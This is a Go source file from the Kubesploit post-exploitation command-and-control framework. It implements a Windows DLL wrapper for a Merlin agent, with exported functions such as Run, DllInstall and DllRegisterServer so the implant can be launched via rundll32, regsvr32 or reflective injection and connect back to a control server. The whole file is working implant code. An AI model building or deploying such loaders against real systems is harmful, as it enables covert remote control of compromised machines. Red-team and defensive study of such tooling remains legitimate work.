// +build windows,cgo

// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit shall not be used in any malicious manner.
// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.

package main

import (
	"C"
	"os"
	"strings"

	// Merlin
	"kubesploit/pkg/agent"
)

var url = "https://127.0.0.1:443"
var psk = "merlin"
var proxy = ""
var host = ""
var ja3 = ""

func main() {}

// run is a private function called by exported functions to instantiate/execute the Agent
func run(URL string) {
	a, err := agent.New("h2", URL, host, psk, proxy, ja3, false, false)
	if err != nil {
		os.Exit(1)
	}
	errRun := a.Run()
	if errRun != nil {
		os.Exit(1)
	}
}

// EXPORTED FUNCTIONS

//export Run
// Run is designed to work with rundll32.exe to execute a Merlin agent.
// The function will process the command line arguments in spot 3 for an optional URL to connect to
func Run() {
	// If using rundll32 spot 0 is "rundll32", spot 1 is "merlin.dll,Run"
	if len(os.Args) >= 3 {
		if strings.HasPrefix(strings.ToLower(os.Args[0]), "rundll32") {
			url = os.Args[2]
		}
	}
	run(url)
}

//export VoidFunc
// VoidFunc is an exported function used with PowerSploit's Invoke-ReflectivePEInjection.ps1
func VoidFunc() { run(url) }

//export DllInstall
// DllInstall is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /n /i merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/bb759846(v=vs.85).aspx
// TODO add support for passing Merlin server URL with /i:"https://192.168.1.100:443" merlin.dll
func DllInstall() { run(url) }

//export DllRegisterServer
// DLLRegisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms682162(v=vs.85).aspx
func DllRegisterServer() { run(url) }

//export DllUnregisterServer
// DLLUnregisterServer is used when executing the Merlin agent with regsvr32.exe (i.e. regsvr32.exe /s /u merlin.dll)
// https://msdn.microsoft.com/en-us/library/windows/desktop/ms691457(v=vs.85).aspx
func DllUnregisterServer() { run(url) }

//export Merlin
// Merlin is an exported function that takes in a C *char, converts it to a string, and executes it.
// Intended to be used with DLL loading
func Merlin(u *C.char) {
	if len(C.GoString(u)) > 0 {
		url = C.GoString(u)
	}
	run(url)
}

// TODO add entry point of 0 (yes a zero) for use with Metasploit's windows/smb/smb_delivery
// TODO move exported functions to merlin.c to handle them properly and only export Run()
